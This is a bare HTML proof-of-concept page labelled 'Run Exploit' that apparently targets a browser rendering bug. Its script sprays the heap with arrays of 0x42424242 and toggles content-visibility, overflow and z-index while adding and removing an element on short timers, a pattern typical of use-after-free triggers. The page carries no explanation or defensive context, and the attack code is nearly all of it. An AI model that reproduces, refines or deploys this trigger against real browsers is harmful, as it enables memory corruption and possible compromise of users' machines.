<!DOCTYPE html>
<html>
<head>
    <style>
        .outer {
            width: 200px;
            height: 200px;
            overflow: hidden;
            position: relative;
            contain: strict;
        }
        .inner {
            width: 100px;
            height: 100px;
            position: absolute;
            content-visibility: auto;
            z-index: 1;
            transform: translateZ(0);
        }
        .child {
            width: 50px;
            height: 50px;
            position: absolute;
            content-visibility: hidden;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <button onclick="trigger()">Run Exploit</button>
    <div class="outer" id="outer">
        <div class="inner" id="inner">
            <div class="child" id="child"></div>
        </div>
    </div>
    <script>
        let spray = [];
        function sprayHeap() {
            for (let i = 0; i < 5000; i++) {
                let arr = new Array(0x100).fill(0x42424242);
                spray.push(arr);
            }
        }

        function trigger() {
            let outer = document.getElementById('outer');
            let inner = document.getElementById('inner');
            let child = document.getElementById('child');

            child.style.contentVisibility = 'visible';
            outer.style.overflow = 'scroll';
            setTimeout(() => {
                child.style.contentVisibility = 'hidden';
                outer.style.overflow = 'hidden';
                sprayHeap();
                let newDiv = document.createElement('div');
                newDiv.style.cssText = 'position: absolute; width: 50px; height: 50px; z-index: 2; content-visibility: auto;';
                inner.appendChild(newDiv);
                setTimeout(() => {
                    inner.style.zIndex = '3';
                    inner.removeChild(newDiv);
                }, 5);
            }, 5);
        }
    </script>
</body>
</html>
